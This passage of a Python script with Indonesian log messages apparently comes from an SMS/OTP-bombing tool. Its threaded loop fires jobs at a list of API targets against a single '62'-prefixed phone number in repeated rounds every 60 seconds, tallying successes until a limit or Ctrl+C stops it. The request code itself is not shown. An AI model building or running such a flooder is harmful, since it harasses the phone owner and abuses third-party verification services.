            if limit_check and limit_check():
                print(f"{Fore.YELLOW}[LIMIT]{Style.RESET_ALL} Limit habis! Menghentikan Infinite Loop...")
                break
                
            round_count += 1
            print(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} Round {round_count} dimulai...")
            success_count = 0
            total_targets = len(TARGETS)
            
            try:
                with ThreadPoolExecutor(max_workers=threads) as executor:
                    futures = []
                    
                    for idx, api in enumerate(TARGETS, 1):
                        if stop_flag:
                            break
                        if limit_check and limit_check():
                            print(f"{Fore.YELLOW}[LIMIT]{Style.RESET_ALL} Limit habis! Berhenti...")
                            stop_flag = True
                            break
                        futures.append(executor.submit(process_target, api, target62, ip, idx, total_targets))
                    
                    for future in as_completed(futures):
                        if stop_flag:
                            for f in futures:
                                if not f.done():
                                    f.cancel()
                            break
                        try:
                            if future.result():
                                success_count += 1
                                total_success += 1
                            else:
                                total_fail += 1
                        except Exception as e:
                            total_fail += 1
                            with print_lock:
                                print(f"{Fore.RED}[!] Future error: {e}{Style.RESET_ALL}")
            except Exception as e:
                with print_lock:
                    print(f"{Fore.RED}[!] Executor error: {e}{Style.RESET_ALL}")
                continue
            
            if stop_flag:
                break
            
            if limit_check and limit_check():
                print(f"{Fore.YELLOW}[LIMIT]{Style.RESET_ALL} Limit habis! Menghentikan Infinite Loop...")
                break
                
            print(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} Round {round_count} selesai. Sukses: {success_count}/{total_targets}")
            print(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} Total: success={total_success} | fail={total_fail}")
            print(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} Menunggu 60 detik...")
            
            for _ in range(60):
                if stop_flag:
                    break
                if limit_check and limit_check():
                    print(f"{Fore.YELLOW}[LIMIT]{Style.RESET_ALL} Limit habis! Menghentikan Infinite Loop...")
                    stop_flag = True
                    break
                time.sleep(1)
            
    except KeyboardInterrupt:
        # 🔥 TANGKAP CTRL+C - SET STOP FLAG
        stop_flag = True
        print()
        print(f"{Fore.YELLOW}[WARNING]{Style.RESET_ALL} Menghentikan proses...")
        # 🔥 RE-RAISE AGAR run_with_ui TAHU
        raise
    except Exception as e:
        with print_lock:
            print(f"{Fore.RED}[ERROR] {e}{Style.RESET_ALL}")
    finally:
        global_callback = None
        global_limit_check = None
    
    if stop_flag:
        print(f"{Fore.YELLOW}[WARNING]{Style.RESET_ALL} Proses dihentikan")
        print(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} Total success: {total_success} | fail: {total_fail}")
    
    return total_success > 0